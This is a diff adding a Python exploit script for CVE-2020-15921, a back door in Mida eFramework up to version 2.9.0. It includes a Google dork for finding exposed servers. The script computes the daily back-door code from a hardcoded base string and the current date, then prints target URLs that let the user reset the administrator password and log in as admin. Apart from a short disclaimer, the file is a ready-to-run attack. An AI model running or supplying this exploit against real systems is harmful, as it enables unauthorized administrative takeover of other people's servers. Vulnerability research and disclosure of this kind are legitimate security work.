@@ -1,0 +1,70 @@
+# Exploit Title: Mida eFramework 2.9.0 - Back Door Access
+# Google Dork: Server: Mida eFramework
+# Date: 2020-08-27
+# Exploit Author: elbae
+# Vendor Homepage: https://www.midasolutions.com/
+# Software Link: http://ova-efw.midasolutions.com/
+# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
+# Version: <= 2.9.0
+# CVE : CVE-2020-15921
+
+
+#! /usr/bin/python3
+# -*- coding: utf-8 -*-
+
+from datetime import date
+
+def print_disclaimer():
+print("""
+---------------------
+Disclaimer:
+1) For testing purpose only.
+2) Do not attack production environments.
+3) Intended for educational purposes only and cannot be used for law
+violation or personal gain.
+4) The author is not responsible for any possible harm caused by this
+material.
+---------------------""")
+
+def print_info():
+print("""
+[*] Mida Solutions eFramework PDC Administrative Back-Door access
+(CVE-2020-15921)
+[*] Reference:
+https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
+[*] This script can be used to retrieve the code which gives you the
+possibility to change the password.
+[*] How it works:
+1) run the script
+2) copy the output to the URL you want to access (i.e.
+http://192.168.1.60:8090/PDC/extreq.php?code=THE-CODE)
+3) change the password
+4) access as admin with the password """)
+
+def main():
+print_info()
+print_disclaimer()
+abc = ['a', 'b', 'c', 'd', 'e', 'f', 'g',
+'h', 'i', 'j', 'k', 'l', 'm', 'n',
+'o', 'p', 'q', 'r', 's', 't', 'u',
+'v', 'w', 'x', 'y', 'z']
+baseString = 'midasoluti' # default value from source code
+today = date.today()
+dateString = "{}0{:02d}0{}".format(today.day, today.month, today.year)
+retString = ""
+
+for i in range(0,len(baseString)):
+n = int(abc.index(baseString[i]))
+m = int(dateString[i])
+s = n+m
+if (s >= len(abc)):
+s = m
+retString += abc[s]
+print("[+] Generated code: {}".format(retString))
+print("[?] Example URL: http://target:8090/PDC/extreq.php?code={0}
+".format(retString))
+print("[?] Example URL: https://target/PDC/extreq.php?code={0}
+".format(retString))
+
+if __name__ == '__main__':
+main()
